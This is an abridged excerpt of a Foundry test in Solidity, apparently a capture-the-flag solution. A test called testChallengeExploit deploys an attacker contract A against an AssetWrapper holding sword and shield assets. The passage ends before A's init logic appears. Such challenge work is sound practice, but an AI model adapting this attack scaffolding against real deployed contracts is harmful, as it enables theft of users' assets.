...
contract Testing is Test {
    ...
    function testChallengeExploit() public {
        ...
        A a = new A(assetWrapper, address(swordAsset), address(shieldAsset));
        a.init(0, address(swordAsset));
        a.init(0, address(shieldAsset));
        vm.stopPrank();
        validation();
    }
...
contract A {
    AssetWrapper private immutable aw;
    address private immutable swordAsset;
    address private immutable shieldAsset;

    constructor(AssetWrapper _aw, address _swordAsset, address _shieldAsset) {
        aw = _aw;
        swordAsset = _swordAsset;
        shieldAsset = _shieldAsset;
    }

    function init(uint256 _nftId, address _gameAsset) external {
